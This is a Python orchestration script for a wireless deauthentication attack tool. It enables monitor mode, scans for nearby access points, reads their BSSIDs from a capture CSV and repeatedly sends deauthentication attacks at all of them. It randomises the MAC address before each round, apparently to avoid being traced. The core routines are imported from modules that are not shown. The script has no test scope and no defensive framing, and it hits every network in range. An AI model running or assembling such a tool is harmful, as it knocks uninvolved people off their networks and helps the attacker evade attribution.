from network_capture import start_monitor_mode, capture_network, get_bssids_from_csv
from deauth import deauthorization
from mac_change import mac_address_change
import os
import sys
import time
from multiprocessing import Manager

manager = Manager()
kill_event = manager.Event()

# Check if running as root
if os.geteuid() != 0:
    print("[ERROR] This script must be run as root. Please use 'sudo'.")
    sys.exit(1)

def main():
    adapter_name = start_monitor_mode()
    if adapter_name:
        time.sleep(2)

        # Start network capture
        capture_process, csv_file = capture_network()

        # Check if CSV file was successfully created
        if not csv_file or not os.path.exists(csv_file):
            print("[ERROR] CSV file was not created. Exiting.")
            capture_process.terminate()
            sys.exit(1)

        try:
            while True:
                # Extract BSSIDs from CSV and proceed with deauthentication
                bssid_list = get_bssids_from_csv(csv_file)
                
                if bssid_list:
                    print(f"[INFO] Found {len(bssid_list)} BSSIDs. Starting deauthentication")
                    # Change MAC address before next deauth
                    mac_address_change()
                    deauthorization(bssid_list)
                else:
                    print("[INFO] No new BSSIDs found, waiting for next capture.")

                time.sleep(30)
        except KeyboardInterrupt:
            kill_event.set()
            print("\n[INFO] Stopping network capture and deauthentication")
            capture_process.terminate()
            
            # Option to reset into managed mode if keyboard interrupt
            reset = input("[PROMPT] Do you want to reset the adapter to managed mode? (y/n): ").strip().lower()
            if reset == 'y':
                from network_capture import reset_monitor_mode
                reset_monitor_mode(adapter_name)
            sys.exit(0)
        except Exception as e:
            print(f"[ERROR] An unexpected error occurred: {e}")
            capture_process.terminate()
            sys.exit(1)
        
if __name__ == "__main__":
    main()
